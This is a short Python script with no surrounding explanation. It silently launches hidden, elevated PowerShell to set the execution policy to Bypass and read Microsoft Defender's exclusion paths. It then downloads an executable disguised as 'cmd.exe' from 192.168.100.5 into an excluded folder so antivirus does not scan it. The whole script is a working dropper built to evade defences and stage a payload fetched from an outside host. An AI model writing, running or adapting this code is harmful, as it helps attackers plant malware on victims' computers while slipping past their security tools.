import subprocess

def run_elevated_powershell_command(command):
    """Run an elevated PowerShell command"""
    subprocess.run(["powershell.exe", "-Command", f"Start-Process powershell.exe -ArgumentList '-Command', '\"{command}\"', '-WindowStyle', 'Hidden', '-Verb', 'RunAs'"], shell=True, check=True)

def locate_exclusions_folder():
    """Locate the exclusions folder for Microsoft Defender"""
    command = 'Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'
    output = subprocess.run(["powershell.exe", "-Command", command], capture_output=True, text=True, shell=True)
    return output.stdout.strip()

def main():
    # Command to change execution policy to Bypass for the local system
    execution_policy_command = 'Set-ExecutionPolicy Bypass -Scope LocalMachine -Force'

    try:
        # Run the elevated PowerShell command to change execution policy silently
        run_elevated_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + execution_policy_command)

        # Locate the exclusions folder for Microsoft Defender
        exclusions_folder = locate_exclusions_folder()

        if exclusions_folder:
            # Command to download the cmd.exe file from 192.168.100.5
            download_command = 'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile "cmd.exe"'

            # Command to move the downloaded file to the exclusions folder
            move_command = f'Move-Item -Path "cmd.exe" -Destination "{exclusions_folder}\\cmd.exe" -Force'

            # Run the elevated PowerShell commands silently
            run_elevated_powershell_command(f"$ErrorActionPreference = 'SilentlyContinue'; {download_command}; {move_command}")

            print("cmd.exe file downloaded and placed in the exclusions folder successfully.")
        else:
            print("Unable to locate the exclusions folder for Microsoft Defender.")
    except subprocess.CalledProcessError as e:
        print("Error executing elevated PowerShell command:", e)

if __name__ == "__main__":
    main()
